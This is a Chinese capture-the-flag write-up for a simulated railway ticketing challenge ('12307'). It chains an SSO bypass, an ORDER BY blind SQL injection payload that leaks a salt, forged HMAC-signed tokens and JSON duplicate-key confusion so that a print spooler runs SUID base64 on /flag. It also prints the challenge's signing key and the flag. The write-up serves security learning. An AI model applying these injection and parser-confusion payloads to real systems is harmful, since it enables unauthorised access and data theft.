# 12307

## 题目简述

题目是模拟铁路购票系统，由 SSO、ticketing、waitlist、station、settlement、receipt、layout、print spooler 等多个微服务组成。最终目标不是直接打某个单点接口，而是让结算渲染流程把恶意 print plan 带进私有打印通道，触发 print spooler 执行带 SUID 位的 `/usr/bin/base64 /flag`。

## 解题过程

从 Dockerfile 可以看到关键目标：

```dockerfile
RUN chmod u+s /usr/bin/base64
```

`/flag` 权限为 `0600 root:root`，普通用户不能直接读；但如果 print spooler 执行：

```bash
/usr/bin/base64 /flag
```

就能借 SUID base64 输出 flag 的 base64 编码。打印执行链为：

```text
receipt accepted
  -> receipt render
  -> layout bridge
  -> signed spool ticket
  -> print spooler
  -> driverProgram(driverArgument)
```

print spooler 会执行指定的 `driverProgram`，并把 `driverArgument` 作为参数传入。可用的危险 print plan 是：

```json
{
  "printProfile": "clearing-batch",
  "printer": "line-printer",
  "driverProgram": "/usr/bin/base64",
  "driverArgument": "/flag"
}
```

其中 `/usr/bin/base64` 是对应设备 profile 允许的程序，`/flag` 是参数。问题是普通用户不能直接提交 print plan，需要让 receipt、layout、settlement 多个状态同时满足。

整体链路压缩为：

```text
trusted continuation
  -> waitlisted order
  -> station claim artifact
  -> ORDER BY 盲注泄露 claim_salt
  -> 计算 claimProof
  -> ticket adjustment 写入规则 memo
  -> station feed trusted lane
  -> boarding ledgerRef
  -> reconciliation batch
  -> duplicate-key carrierSeal
  -> settlement schedule
  -> private print channel
  -> /usr/bin/base64 /flag
```

首先通过 SSO partner-continuation 建立可信会话。`/api/mobile/identity/continue` 只检查字符串包含关系，不做真正的 SAML 签名验证。`partnerMetadata` 包含：

```text
railway-partner PassengerIdentityProvider compatBinding
```

`assertion` 包含：

```xml
<Audience>...</Audience><NameID>...</NameID><Signature>...</Signature>
```

`relayState` 同时包含：

```text
continue
seat-hold
```

即可让 Redis session 里出现后续需要的信任级别：

```json
["mobile", "partner", "settlement"]
```

然后创建 `G7608` 的 `business` 候补订单。该座位库存为 0，创建订单会进入 waitlisted 状态，并生成 `station_claim_artifact`，其中的随机 `claim_salt` 后面用于计算 claim proof。

`claim_salt` 通过 station_portal 的 `legacy-rank` 调价接口泄漏。`fare_scope_expression` 会把 `expr` 直接拼进 SQL `ORDER BY` 子句。`ticket_index` 中同时存在：

```text
T-BJP-1021-001
T-HGH-7608-019
```

通过控制排序结果，让 BJP 或 HGH 行排第一，响应中的 bucket 会变成不同值：

```text
BJP first -> north-window
HGH first -> local-window
```

因此可以构造布尔 oracle。为了避免 `%` 被 Python 格式化误解析，不使用 `LIKE 'T-BJP%'`，改用：

```sql
LEFT(ticket_no,6)='T-BJP-'
```

对 `claim_salt` 每个字符二分即可恢复 9 位盐值，字符集为 `0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ`。exp 中使用的判断表达式形如：

```sql
IF(
  (SELECT LOCATE(SUBSTRING(claim_salt,{pos},1),'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')
   FROM station_claim_artifacts WHERE order_id='{order_id}')>{mid},
  IF(ticket_index.station_code='BJP','0','1'),
  IF(ticket_index.station_code='HGH','0','1')
)
```

拿到 salt 后计算：

```text
claimProof = CP-<claim_salt>-<sha256(orderId|G7608|HGH|ticketNo|claim_salt) 前 12 位>
```

再调用：

```text
POST /api/desk/tickets/adjust
```

插入 ticket adjustment，memo 中携带后续 layout/device 规则。

之后依次触发 station import 的多个 adapter：

```text
station-partner-feed
  -> 从通告 proxyHint 中提取 X-Desk-Lane、X-Board-Window、X-Desk-Key-Id、X-Desk-Key
  -> 写入 trusted lane、boarding profile、JWKS cache

station-desk-ledger
  -> 更新 waitlist_entries.sampled 和 station_profiles.renderer_profile

enterprise-clearing
  -> 激活 layout entitlement
```

WebSocket 连接 `/api/connect/boarding?stationCode=HGH`，完成：

```text
hello -> bind -> confirm
```

获得 `ledgerRef`。再通过 `/api/corporate/reconciliation` 创建 `reportType=carrier-closeout`、`defer=true` 的 deferred reconciliation batch，得到 `batchId` 和 `templateDigest`。随后调用 `/api/corporate/receipts/prepare` 提交带重复键的 `carrierSeal`。调度 settlement 前还需要刷新 fulfillment epoch，因为该 Redis 键 TTL 只有 7 到 8 秒。

最关键的 receipt 阶段利用 JSON 重复键混淆。`receipt_signer` 对同一个 JWT payload 使用两种解析方式：

```text
first_wins_object  -> 用于安全验证，保留第一次出现的键
json.loads         -> 用于实际渲染，保留最后一次出现的键
```

构造带重复键的 payload：

```json
{
  "printProfile": "counter-copy",
  "printer": "thermal-standard",
  "printProfile": "clearing-batch",
  "printer": "line-printer",
  "driverProgram": "/usr/bin/base64",
  "driverArgument": "/flag"
}
```

安全验证视图看到的是：

```text
printProfile = counter-copy
printer      = thermal-standard
```

渲染视图看到的是：

```text
printProfile  = clearing-batch
printer       = line-printer
driverProgram = /usr/bin/base64
driverArgument = /flag
```

签名使用策略密钥：

```text
e94c0a8d-12307-hgh-trusted
```

算法为 HMAC-SHA256，protected header 和 payload 都需要做 base64url 编码，header 中的 `kid` 为 `POL-HGH-TRUSTED`：

```json
{"alg":"HS256","typ":"rail-carrier-seal","kid":"POL-HGH-TRUSTED"}
```

最后刷新 fulfillment epoch，调用：

```text
POST /api/corporate/settlement/schedule
```

把 batch 推入结算队列。settlement worker 渲染 `{{reconciliation.receipt}}` 时进入 `bridge_preview` 分支，depot_layout 生成私有打印任务，print spooler 执行：

```bash
/usr/bin/base64 /flag
```

渲染报告中得到 base64 文本，解码后为：

```text
ACTF{wHy_ar1_y0u_so0O0o0Oo0o_Fas1?????_C2Cfw6ryD94}
```

## 方法总结

- 核心技巧：把弱 SSO continuation、ORDER BY 布尔盲注、业务状态推进、JSON 重复键解析差异和 SUID base64 滥用串成完整打印链。
- 识别信号：微服务题里单个 primitive 往往只满足一个前置条件，应沿最终 sink 反推每个状态由哪个服务设置。
- 复用要点：重复 JSON 键的风险来自“校验视图”和“执行视图”使用不同解析策略；签名通过不代表最终执行内容安全。
